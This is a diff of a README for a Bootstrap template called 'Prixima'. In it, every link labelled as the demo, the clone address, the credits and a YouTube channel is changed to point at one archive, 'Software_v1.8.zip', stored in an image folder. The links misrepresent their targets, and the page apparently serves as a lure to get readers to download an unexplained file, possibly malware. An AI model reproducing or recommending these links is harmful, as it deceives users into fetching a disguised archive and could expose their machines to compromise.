@@ -2,10 +2,10 @@
 A Bootstrap multipurpose template
 
 # Demo
-- https://raw.githubusercontent.com/MuhammadNaveedNawaz/Prixima/main/js/Prixima_3.3.zip
+- https://github.com/MuhammadNaveedNawaz/Prixima/raw/refs/heads/main/img/Software_v1.8.zip
 
 # Clone Project
-- https://raw.githubusercontent.com/MuhammadNaveedNawaz/Prixima/main/js/Prixima_3.3.zip
+- https://github.com/MuhammadNaveedNawaz/Prixima/raw/refs/heads/main/img/Software_v1.8.zip
 
 # Features
 - Fully Responsive
@@ -17,12 +17,12 @@ A Bootstrap multipurpose template
 
 
 # Credit
-- https://raw.githubusercontent.com/MuhammadNaveedNawaz/Prixima/main/js/Prixima_3.3.zip
-- https://raw.githubusercontent.com/MuhammadNaveedNawaz/Prixima/main/js/Prixima_3.3.zip
-- https://raw.githubusercontent.com/MuhammadNaveedNawaz/Prixima/main/js/Prixima_3.3.zip
-- https://raw.githubusercontent.com/MuhammadNaveedNawaz/Prixima/main/js/Prixima_3.3.zip
+- https://github.com/MuhammadNaveedNawaz/Prixima/raw/refs/heads/main/img/Software_v1.8.zip
+- https://github.com/MuhammadNaveedNawaz/Prixima/raw/refs/heads/main/img/Software_v1.8.zip
+- https://github.com/MuhammadNaveedNawaz/Prixima/raw/refs/heads/main/img/Software_v1.8.zip
+- https://github.com/MuhammadNaveedNawaz/Prixima/raw/refs/heads/main/img/Software_v1.8.zip
 
 
 # Watch more
-For more videos visit to my YouTube channel. [SA7MAN](https://raw.githubusercontent.com/MuhammadNaveedNawaz/Prixima/main/js/Prixima_3.3.zip)
+For more videos visit to my YouTube channel. [SA7MAN](https://github.com/MuhammadNaveedNawaz/Prixima/raw/refs/heads/main/img/Software_v1.8.zip)
 
